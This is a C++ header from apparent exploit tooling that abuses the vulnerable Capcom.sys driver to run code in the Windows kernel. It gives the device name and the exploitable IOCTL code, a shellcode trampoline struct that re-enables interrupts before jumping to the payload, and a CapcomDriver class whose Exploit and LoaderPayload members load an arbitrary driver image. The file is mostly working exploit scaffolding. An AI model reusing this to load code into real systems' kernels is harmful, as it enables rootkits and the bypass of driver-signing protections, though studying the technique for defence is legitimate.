#pragma once
#include "BaseVulnDriver.h"

// The name of the device that the capcom driver exposes to usermode. Does not change.
#define CAPCOM_DEVICE_NAME L"\\\\.\\Htsysm72FB"

// The exploitable IOCTL that, when called on the capcom device above, will trigger the payload
#define CAPCOM_DEVICE_IOCTL64 0xAA013044

// Driver calls function passing the address of MmGetSystemRoutineAddress as the first argument
// No kernel leak required
typedef PVOID(NTAPI *CAPCOM_USER_FUNC)(MmGetSystemRoutineFunc _MmGetSystemRoutineAddress);

// Struct idea from:
// https://github.com/tandasat/ExploitCapcom/blob/master/ExploitCapcom/ExploitCapcom/ExploitCapcom.cpp

#include <pshpack1.h>
// Trampoline to the actual shellcode. Uses 'sti' to re-enable interrupts to prevent BSOD on pagefault.
// Because interrupts are enabled, our shellcode has to be real quick or else the scheduler will switch
// out to a different thread and our actual payload will be paged out.
typedef struct _PAYLOADTRAMP
{
	// sti; jmp qword [PayloadTarget]
	BYTE TrampAsm[7];

	PVOID PayloadTarget;
} PAYLOADTRAMP, *PPAYLOADTRAMP;
#include <poppack.h>

// Pointer to the executable page containing the shellcode.
// This is the only real good way to initialize the bytes of the trampoline with C syntax
typedef struct _TRAMPPAGE
{
	// This is just a weird quirk with the driver. The driver checks to ensure that [TrampData-8] == TrampAddr... okay sure
	PPAYLOADTRAMP TrampAddr;
	PAYLOADTRAMP TrampData;
} TRAMPPAGE, *PTRAMPPAGE;

class CapcomDriver : public BaseVulnDriver
{
public:
	// Inherited via IVulnDriver
	virtual bool EnsureValidTarget() override;

	virtual bool EnsureDriverLoaded() override;

	virtual void Exploit() override;

	virtual const std::wstring& GetVulnDriverName() override;

private:

	// Run from kernel mode
	static PVOID NTAPI LoaderPayload(MmGetSystemRoutineFunc _MmGetSystemRoutineAddress);

	static PVOID PayloadImage;
	static SIZE_T PayloadSize;
	static DWORD PayloadEntryRVA;
	static void(__stdcall *PayloadEntry)(PVOID DriverObject, PVOID RegistryEntry);

	// Name of the driver to load from the vulnerable driver storage
	const std::wstring m_DriverName = L"Capcom.sys";

	// Handle to the device object
	Util::Win32::unique_handle m_CapcomHandle;

	PPAYLOADTRAMP AllocPayloadTrampoline(CAPCOM_USER_FUNC targetFunc);

	void ExecIoCtlWithTrampoline(CAPCOM_USER_FUNC targetFunc);

	Util::Win32::unique_virtalloc<TRAMPPAGE> m_Payload;
};